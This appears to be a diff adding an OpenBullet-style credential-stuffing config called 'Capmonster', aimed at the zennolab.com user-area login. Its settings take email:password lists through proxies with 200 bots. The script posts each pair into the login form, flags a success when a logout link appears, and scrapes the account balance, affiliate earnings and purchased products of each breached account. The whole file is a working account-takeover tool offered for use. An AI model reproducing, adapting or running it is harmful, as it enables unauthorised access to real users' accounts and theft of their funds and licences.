@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Capmonster",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-12T20:29:28.8944473+01:00",
+  "AdditionalInfo": "",
+  "Author": "AgainThere",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GetMethod REQUEST GET "https://userarea.zennolab.com/lk/login.aspx" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: userarea.zennolab.com" 
+  HEADER "Referer: https://userarea.zennolab.com/lk/login.aspx" 
+
+#PostMethod REQUEST POST "https://userarea.zennolab.com/lk/login.aspx" 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE5MDY0MzQ3MjUPZBYCZg9kFgICAw9kFgYCAQ8UKwAGDxYCHgVWYWx1ZQUCZW5kZGQ8KwAPAQ48KwAGAQMPFgIeCklzU2F2ZWRBbGxnDxQrAAIUKwABFgYeBFRleHQFB0VuZ2xpc2gfAAUCZW4eDlJ1bnRpbWVDcmVhdGVkZxQrAAEWBh8CBQ7QoNGD0YHRgdC60LjQuR8ABQJydR8DZ2RkZGQCBQ9kFgJmD2QWAmYPZBYCAg8PDxYCHwJlZGQCBw8WAh4HVmlzaWJsZWcWAgIDDw8WAh8CBQVDbG9zZWRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBR5jdGwwMCRBU1B4Q29tYm9Cb3hMYW5ndWFnZSRERERMx6pIU1BtSl2Hy2KxOG%2Fz%2FOaZBGcTiaz%2FgtULmot9Sg%3D%3D&__VIEWSTATEGENERATOR=EE167D82&__EVENTVALIDATION=%2FwEdAAZ%2BJGIO42aBj3H7XizgArSB1YzBi%2Fv72U3i%2FiPEshIfWPYuJ84xN8rnDqaBemzuTFmQ%2BfzK4Im520GwSoSwy9U7jshXF1rHAdz37VtbwfxxtkVETOsgd9PfcPnX4GwJ3qSqKExLY7hiQf%2BAu70apVoTypNK9qApxoOCgBOFRRLrwg%3D%3D&ctl00_ASPxComboBoxLanguage_VI=en&ctl00%24ASPxComboBoxLanguage=English&ctl00%24ASPxComboBoxLanguage%24DDDState=%7B%26quot%3BwindowsState%26quot%3B%3A%26quot%3B0%3A0%3A-1%3A0%3A0%3A0%3A-10000%3A-10000%3A1%3A0%3A0%3A0%26quot%3B%7D&ctl00%24ASPxComboBoxLanguage%24DDD%24L=en&ctl00%24ContentPlaceHolder1%24Login1%24UserName=<USER>&ctl00%24ContentPlaceHolder1%24Login1%24Password=<PASS>&ctl00%24ContentPlaceHolder1%24Login1%24ButtonHide=&DXScript=1_10%2C1_11%2C1_22%2C1_62%2C1_12%2C1_13%2C1_257%2C1_258%2C1_20%2C1_21%2C1_264%2C1_14%2C1_16%2C1_260%2C1_267%2C1_40&DXCss=1_284%2C1_281%2C1_66%2C1_67%2C1_68%2C1_283%2C1_280%2C1_72%2C1_71%2Ccss%2Fstyles.css" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: userarea.zennolab.com" 
+  HEADER "Referer: https://userarea.zennolab.com/lk/login.aspx" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Logout</a></li>" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "Logout</a></li>" 
+
+#Balance PARSE "<SOURCE>" LR "href=\"UserBalance.aspx\">Balance: " "</a></strong>;  <strong><" -> CAP "Balance" 
+
+#AffiliateBalance PARSE "<SOURCE>" LR "href=\"AffiliateProgram.aspx\">Earned in affiliate program: " "</a></strong></span>" -> CAP "Aff Balance" 
+
+#GetProducts REQUEST GET "https://userarea.zennolab.com/lk/userarea/UserCustomer.aspx" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: userarea.zennolab.com" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "No data to display" 
+
